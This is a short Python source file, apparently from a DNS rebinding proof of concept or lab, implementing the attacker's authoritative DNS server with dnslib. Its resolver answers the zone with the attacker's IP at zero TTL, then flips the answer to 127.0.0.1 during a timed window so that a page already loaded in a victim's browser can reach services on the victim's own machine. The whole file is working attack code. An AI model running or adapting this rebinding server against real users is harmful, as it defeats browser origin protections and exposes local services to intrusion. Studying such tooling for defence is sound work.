"""Attacker DNS: the zone answers our IP, then flips to 127.0.0.1 after the page loads."""

import os

from dnslib import NS, QTYPE, RR, SOA, A
from dnslib.server import BaseResolver, DNSServer

import phase

ATTACKER_IP = os.environ["ATTACKER_IP"]
ZONE = os.environ.get("ZONE", "rebind.test")
NS_NAME = os.environ.get("NS_NAME", "ns1." + ZONE)
DNS_BIND = os.environ.get("DNS_BIND", "127.0.0.1")
DNS_PORT = int(os.environ.get("DNS_PORT", "5353"))


class RebindResolver(BaseResolver):
    def resolve(self, request, handler):
        reply = request.reply()
        reply.header.aa = 1
        name = str(request.q.qname).rstrip(".").lower()
        if name != ZONE and not name.endswith("." + ZONE):
            return reply

        if request.q.qtype == QTYPE.A:
            ip = "127.0.0.1" if phase.in_local_window() else ATTACKER_IP
            reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A(ip), ttl=0))
        elif request.q.qtype == QTYPE.NS:
            reply.add_answer(
                RR(request.q.qname, QTYPE.NS, rdata=NS(NS_NAME + "."), ttl=300)
            )
        elif request.q.qtype == QTYPE.SOA:
            soa = SOA(
                NS_NAME + ".", "hostmaster." + ZONE + ".", (1, 300, 300, 300, 300)
            )
            reply.add_answer(RR(request.q.qname, QTYPE.SOA, rdata=soa, ttl=300))
        return reply


if __name__ == "__main__":
    print(f"[dns] {DNS_BIND}:{DNS_PORT}  {ZONE} -> {ATTACKER_IP}, then 127.0.0.1")
    DNSServer(RebindResolver(), address=DNS_BIND, port=DNS_PORT).start()
